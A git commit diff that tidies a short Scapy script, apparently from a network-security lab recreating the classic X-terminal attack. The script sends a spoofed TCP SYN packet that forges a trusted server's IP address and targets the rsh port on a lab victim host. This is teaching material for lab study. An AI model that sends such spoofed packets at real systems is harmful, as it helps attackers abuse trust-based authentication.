1064423392238b60329bc32f12d24b5d661239dc
Pastoreekahk S Arthur <139224166+pastoreekahk96@users.noreply.github.com>
2026-09-03 21:36:40 +0000

    clean Scapy import and Python shebang in SYN lab script

--- synpacket.py
+++ synpacket.py
@@ -1,9 +1,10 @@
-#!usr/bin/python3
+#!/usr/bin/env python3
 
-from scapy.all import *
+from scapy.all import IP, TCP, send
 
 print("Sending Spoofed SYN packet to X-terminal (victim)")
-ip = IP(src="192.168.12.6", dst="192.168.12.5") #src is Trusted Server IP and dst is X-terminal IP
-tcp = TCP(sport=1023,dport=514,flags="S", seq=123456789) #sport is Trusted Server port and dport is X-terminal port, S is SYN packet flag
-pkt = ip/tcp 
-send(pkt,verbose=0) #send packet
+ip = IP(src="192.168.12.6", dst="192.168.12.5")  # Trusted server -> X-terminal
+# Trusted server port -> X-terminal port; S = SYN packet flag.
+tcp = TCP(sport=1023, dport=514, flags="S", seq=123456789)
+pkt = ip / tcp
+send(pkt, verbose=0)
